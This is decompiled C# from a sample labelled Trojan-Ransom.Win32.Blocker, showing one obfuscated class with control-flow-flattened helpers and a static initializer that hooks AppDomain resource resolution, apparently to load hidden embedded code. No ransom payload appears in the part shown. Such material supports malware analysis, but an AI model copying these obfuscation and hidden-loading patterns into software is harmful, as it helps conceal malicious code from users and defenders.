// Decompiled with JetBrains decompiler
// Type: SmartAssembly.SmartUsageCore.DoNotPruneAttribute
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;

namespace SmartAssembly.SmartUsageCore
{
  [AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
  public sealed class DoNotPruneAttribute : Attribute
  {
    private static bool Ⴜ;

    public DoNotPruneAttribute()
    {
      try
      {
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static DoNotPruneAttribute()
    {
      try
      {
        DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static Decimal Ⴃ([In] Decimal obj0, [In] Decimal obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 66:
            num2 = 4;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 4:
              goto label_8;
            case 1:
            case 2:
              num1 = 6;
              continue;
            case 3:
            case 5:
              num1 = 6;
              continue;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotPruneAttribute.Ⴃ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return Decimal.Add(obj0, obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<Decimal> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<Decimal> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static Assembly Ⴐ([In] int obj0, [In] int obj1)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj1 ^ obj0)
        {
          case 104:
            num2 = 1;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 2:
            case 5:
              goto label_8;
            case 3:
              num1 = 6;
              continue;
            case 4:
            case 7:
              num1 = 6;
              continue;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotPruneAttribute.Ⴐ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return Assembly.GetExecutingAssembly();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    internal static void Ⴈ([In] Thread obj0, [In] ApartmentState obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 5;
              continue;
            case 1:
            case 2:
            case 4:
              goto label_7;
            case 3:
              goto label_8;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 107:
                  num2 = 4;
                  break;
                default:
                  num2 = 0;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.SetApartmentState(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Thread o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<ApartmentState> o4 = (Enum) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static byte[] Ⴄ([In] SymmetricAlgorithm obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 35:
            num2 = 8;
            break;
          case 36:
            num2 = 3;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              num1 = 2;
              continue;
            case 2:
              goto label_3;
            case 3:
            case 4:
              goto label_10;
            case 6:
              num1 = 2;
              continue;
            case 8:
              goto label_9;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotPruneAttribute.Ⴄ);
              num1 = 2;
              continue;
          }
        }
label_9:
        return obj0.Key;
label_10:
        return obj0.IV;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        SymmetricAlgorithm o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void Ⴍ([In] Component obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
              goto label_7;
            case 2:
            case 3:
            case 4:
              num1 = 5;
              continue;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 14:
                  num2 = 0;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.Dispose();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Component o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static object Ⴗ([In] System.Type obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 97:
            num2 = 2;
            break;
          default:
            num2 = 7;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 5:
              goto label_8;
            case 1:
            case 4:
              num1 = 3;
              continue;
            case 3:
              goto label_3;
            case 7:
              num1 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotPruneAttribute.Ⴗ);
              num1 = 3;
              continue;
          }
        }
label_8:
        return Activator.CreateInstance(obj0, obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        System.Type o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static SizeF Ⴀ(
      [In] Graphics obj0,
      [In] string obj1,
      [In] Font obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj5 ^ obj4)
        {
          case 89:
            num2 = 3;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
              num1 = 7;
              continue;
            case 2:
            case 3:
              goto label_8;
            case 5:
              num1 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotPruneAttribute.Ⴀ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return obj0.MeasureString(obj1, obj2, obj3);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Graphics o2 = obj0;
        string o3 = obj1;
        Font o4 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj4;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) obj5;
        StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7);
        throw;
      }
    }

    internal static bool Ⴓ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 40:
            num2 = 0;
            break;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
              goto label_8;
            case 3:
              num1 = 7;
              continue;
            case 4:
              num1 = 7;
              continue;
            case 6:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotPruneAttribute.Ⴓ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return obj0.IsByRef;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        System.Type o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void ႰႣ()
    {
      int num1;
      System.Type type;
      int num2;
      int num3;
      try
      {
        num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 3:
            case 4:
              goto label_4;
            default:
              if (!DoNotPruneAttribute.Ⴜ)
              {
                num1 = 1;
                continue;
              }
              goto label_16;
          }
        }
label_16:
        return;
label_4:
        Monitor.Enter((object) (type = typeof (DoNotPruneAttribute)));
        try
        {
          num2 = 2;
          while (true)
          {
            switch (num2)
            {
              case 1:
                DoNotPruneAttribute.Ⴜ = true;
                AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Ⴈ.Ⴐ.Ⴗ);
                goto case 4;
              case 4:
                num2 = 5;
                continue;
              case 5:
                goto label_12;
              default:
                num2 = DoNotPruneAttribute.Ⴜ ? 5 : 1;
                continue;
            }
          }
        }
        finally
        {
          Monitor.Exit((object) type);
        }
label_12:
        num3 = 2;
        while (true)
        {
          switch (num3)
          {
            case 0:
              goto label_10;
            case 1:
            case 3:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DoNotPruneAttribute.ႰႣ);
              num3 = 0;
              continue;
            case 5:
              goto label_18;
            default:
              num3 = 0;
              continue;
          }
        }
label_10:
        return;
label_18:;
      }
      catch (Exception ex)
      {
        System.Type o1 = type;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num3;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴅ
    {
      internal Label Ⴗ;
      internal Image Ⴄ;
      internal Icon Ⴍ;
      internal Bitmap Ⴐ;
      internal IconState Ⴀ;
      internal float Ⴓ;
      internal float Ⴈ;
    }
  }
}
